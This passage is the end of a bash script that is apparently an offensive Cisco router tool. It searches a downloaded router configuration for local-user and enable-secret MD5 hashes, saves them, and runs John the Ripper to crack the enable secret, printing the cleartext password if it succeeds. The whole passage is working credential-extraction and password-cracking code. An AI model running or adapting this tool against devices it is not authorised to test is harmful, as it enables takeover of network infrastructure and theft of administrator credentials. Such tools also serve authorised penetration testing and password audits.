	echo "Pres enter to continue"
	read enterkey
	clear
fi

# look for any local users with MD5 set
LOCPW5=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "secret 5" 2>&1`
if [ -z "$LOCPW5" ]
then
	echo ""
else
echo -e "\e[1;33m---------------------------------------------------------------------------------------------------------------------\e[00m"
echo "I have found local users with MD5 passwords set. I won't crack these but they are listed below. Try John The Ripper"
echo -e "\e[1;33m---------------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[00;32m$LOCPW5\e[00m"
echo "$LOCPW5" >"$OUTPUTDIR$CISCOIP-ciscolocalusersecret5pw.txt"
echo ""
fi

# get enable secret md5 hash
SECPW5=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable secret 5" |awk '{ print $NF }' 2>&1`
if [ -z "$SECPW5" ]
then
	echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
	echo "I can't find a type 5 enable secret password. Perhaps one is not set"
	echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
	exit 1
else
echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
echo "I have extracted the MD5 for the enable secret password"
echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
echo -e "\e[00;32m$SECPW5\e[00m"
echo "$SECPW5" >"$OUTPUTDIR$CISCOIP-ciscosecret5pw.txt"
fi
echo ""
echo "Press enter to continue and try and crack the secret, or CTRL C to abort this process"
read enterkey
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo "I will now try and crack the MD5 for the enable secret, I will only try a quick wordlist at first. It will take "$JOHNWAIT" seconds"
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
screen -d -m -S Cisc0wn-John "$JOHNDIR"john --wordlist="$JOHNPASS"password.lst --rules "$OUTPUTDIR$CISCOIP"-ciscosecret5pw.txt >/dev/null 2>&1
sleep $JOHNWAIT

CLEARPW5=`grep "$SECPW5" "$JOHNPASS"john.pot |cut -d ":" -f 2 2>&1`
if [ -z "$CLEARPW5" ]
then
	clear
	echo ""
	echo -e "\e[1;33mSorry I couldn't crack the enable secret with a wordlist.\e[00m"
	echo ""
	echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------\e[00m"
	echo "I will now try and more detailed password crack using John The Ripper, this may take 10 mins to 10 hours."
	echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------\e[00m"
	echo ""
	echo "Press enter to continue and try and crack it, or CTRL C to abort"
	read enterkey
	rm "$JOHNPASS"john.rec >/dev/null 2>&1
	"$JOHNDIR"john "$OUTPUTDIR$CISCOIP"-ciscosecret5pw.txt
	echo ""
	echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
	echo -e "All of the downloaded files can be found here \e[1;33m"$OUTPUTDIR$CISCOIP"*\e[00m"
	echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"

else
clear
echo -e "\e[1;33m-----------------------------------------------------------------------\e[00m"
echo "I have cracked the enable secret MD5. The clear text password is below"
echo -e "\e[1;33m-----------------------------------------------------------------------\e[00m"
echo -e "\e[00;32m"$CLEARPW5"\e[00m"
echo ""
echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
echo -e "All the downloaded files can be found here \e[1;33m"$OUTPUTDIR$CISCOIP"*\e[00m"
echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
fi
# END
